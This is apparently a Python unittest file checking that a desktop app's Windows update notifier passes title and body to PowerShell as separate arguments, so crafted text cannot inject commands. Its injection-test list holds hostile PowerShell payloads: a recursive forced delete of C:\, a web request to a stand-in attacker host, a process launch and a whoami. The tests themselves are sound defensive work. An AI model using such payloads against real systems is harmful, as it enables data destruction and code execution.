"""Tests for smartbar.update_runner's win32 notification arm.

update_runner.notify() historically just logged on win32 instead of raising
a real toast (the else-branch's notify-send fork would exec a binary that
does not exist there, and the blanket `except OSError` around it swallows
the resulting FileNotFoundError indistinguishably from a genuinely broken
notifier — see tests/test_runner_portability.py for that history). These
pin the replacement: a PowerShell NotifyIcon balloon, spawned with
title/body passed as their own argv elements rather than characters baked
into the -Command script text, so a crafted title or body can never change
what the script itself does.

No real subprocess is ever spawned here — subprocess.run and shutil.which
are both mocked. Nothing here proves a balloon actually renders on a real
Windows box; see _win32_notify's docstring for that caveat.
"""

from __future__ import annotations

import os
import unittest
from unittest import mock

from smartbar import update_runner


class WindowsPlatform(unittest.TestCase):
    """Fakes sys.platform == "win32" the way tests/test_warmup_runner.py and
    tests/test_runner_portability.py already do: monkeypatch the module's
    own `sys.platform` attribute, restore it in tearDown."""

    def setUp(self):
        self.saved_platform = update_runner.sys.platform
        self.saved_notify = os.environ.get("SMARTBAR_UPDATE_NOTIFY")
        os.environ.pop("SMARTBAR_UPDATE_NOTIFY", None)
        update_runner.sys.platform = "win32"

    def tearDown(self):
        update_runner.sys.platform = self.saved_platform
        if self.saved_notify is None:
            os.environ.pop("SMARTBAR_UPDATE_NOTIFY", None)
        else:
            os.environ["SMARTBAR_UPDATE_NOTIFY"] = self.saved_notify


class TestArgvShape(WindowsPlatform):
    def test_prefers_pwsh_over_powershell(self):
        with (
            mock.patch.object(
                update_runner.shutil,
                "which",
                side_effect=lambda name: {"pwsh": "/fake/pwsh"}.get(name),
            ) as fake_which,
            mock.patch.object(update_runner, "subprocess") as fake_subprocess,
        ):
            fake_subprocess.SubprocessError = Exception
            update_runner.notify("AI smartbar updated", "Now on 1.2.3")
        fake_which.assert_any_call("pwsh")
        argv = fake_subprocess.run.call_args[0][0]
        self.assertEqual(argv[0], "/fake/pwsh")

    def test_falls_back_to_powershell_when_pwsh_missing(self):
        with (
            mock.patch.object(
                update_runner.shutil,
                "which",
                side_effect=lambda name: {"powershell": "/fake/powershell.exe"}.get(
                    name
                ),
            ),
            mock.patch.object(update_runner, "subprocess") as fake_subprocess,
        ):
            fake_subprocess.SubprocessError = Exception
            update_runner.notify("title", "body")
        argv = fake_subprocess.run.call_args[0][0]
        self.assertEqual(argv[0], "/fake/powershell.exe")

    def test_title_and_body_are_trailing_argv_elements(self):
        """title/body must be their own argv slots, appended after the
        -Command script — never concatenated into the script string."""
        with (
            mock.patch.object(update_runner.shutil, "which", return_value="/fake/pwsh"),
            mock.patch.object(update_runner, "subprocess") as fake_subprocess,
        ):
            fake_subprocess.SubprocessError = Exception
            update_runner.notify("AI smartbar updated", "Now on 1.2.3")
        argv = fake_subprocess.run.call_args[0][0]
        self.assertEqual(argv[-2:], ["AI smartbar updated", "Now on 1.2.3"])
        command_index = argv.index("-Command")
        script = argv[command_index + 1]
        self.assertNotIn("AI smartbar updated", script)
        self.assertNotIn("Now on 1.2.3", script)
        # The script references them positionally instead.
        self.assertIn("$args[0]", script)
        self.assertIn("$args[1]", script)

    def test_no_console_flash_kwargs_are_passed_through(self):
        with (
            mock.patch.object(update_runner.shutil, "which", return_value="/fake/pwsh"),
            mock.patch.object(update_runner, "subprocess") as fake_subprocess,
            mock.patch.object(
                update_runner.portable,
                "no_window",
                return_value={"creationflags": 0x08000000},
            ),
        ):
            fake_subprocess.SubprocessError = Exception
            update_runner.notify("title", "body")
        kwargs = fake_subprocess.run.call_args[1]
        self.assertEqual(kwargs.get("creationflags"), 0x08000000)


class TestInjectionNeutralised(WindowsPlatform):
    """A crafted title/body must never be able to change what the
    PowerShell script does — it can only ever be literal $args data."""

    PAYLOADS = [
        "'; Remove-Item C:\\ -Recurse -Force; '",
        "$(Invoke-WebRequest evil.example)",
        '"; Start-Process calc.exe; "',
        "`whoami`",
        "innocent title\nwith a newline",
    ]

    def test_hostile_body_never_lands_in_the_script_text(self):
        for payload in self.PAYLOADS:
            with (
                self.subTest(payload=payload),
                mock.patch.object(
                    update_runner.shutil, "which", return_value="/fake/pwsh"
                ),
                mock.patch.object(update_runner, "subprocess") as fake_subprocess,
            ):
                fake_subprocess.SubprocessError = Exception
                update_runner.notify("title", payload)
            argv = fake_subprocess.run.call_args[0][0]
            command_index = argv.index("-Command")
            script = argv[command_index + 1]
            # The payload only ever shows up as its own argv element...
            self.assertIn(payload, argv)
            # ...never woven into the script PowerShell actually parses.
            self.assertNotIn(payload, script)

    def test_hostile_title_never_lands_in_the_script_text(self):
        for payload in self.PAYLOADS:
            with (
                self.subTest(payload=payload),
                mock.patch.object(
                    update_runner.shutil, "which", return_value="/fake/pwsh"
                ),
                mock.patch.object(update_runner, "subprocess") as fake_subprocess,
            ):
                fake_subprocess.SubprocessError = Exception
                update_runner.notify(payload, "body")
            argv = fake_subprocess.run.call_args[0][0]
            command_index = argv.index("-Command")
            script = argv[command_index + 1]
            self.assertIn(payload, argv)
            self.assertNotIn(payload, script)


class TestNoShellFound(WindowsPlatform):
    def test_logs_and_returns_without_raising(self):
        with (
            mock.patch.object(update_runner.shutil, "which", return_value=None),
            mock.patch.object(update_runner, "subprocess") as fake_subprocess,
            mock.patch.object(update_runner.log, "info") as fake_info,
        ):
            fake_subprocess.SubprocessError = Exception
            update_runner.notify("title", "body")  # must not raise
        fake_subprocess.run.assert_not_called()
        fake_info.assert_called_once()


class TestNotifyFailureNeverPropagates(WindowsPlatform):
    def test_oserror_from_subprocess_is_swallowed(self):
        with (
            mock.patch.object(update_runner.shutil, "which", return_value="/fake/pwsh"),
            mock.patch.object(
                update_runner.subprocess, "run", side_effect=OSError("boom")
            ),
        ):
            update_runner.notify("title", "body")  # must not raise

    def test_timeout_from_subprocess_is_swallowed(self):
        import subprocess as real_subprocess

        with (
            mock.patch.object(update_runner.shutil, "which", return_value="/fake/pwsh"),
            mock.patch.object(
                update_runner.subprocess,
                "run",
                side_effect=real_subprocess.TimeoutExpired(cmd="pwsh", timeout=15),
            ),
        ):
            update_runner.notify("title", "body")  # must not raise

    def test_notify_off_short_circuits_before_any_platform_check(self):
        os.environ["SMARTBAR_UPDATE_NOTIFY"] = "off"
        with (
            mock.patch.object(update_runner.shutil, "which") as fake_which,
            mock.patch.object(update_runner, "subprocess") as fake_subprocess,
        ):
            update_runner.notify("title", "body")
        fake_which.assert_not_called()
        fake_subprocess.run.assert_not_called()


if __name__ == "__main__":
    unittest.main()
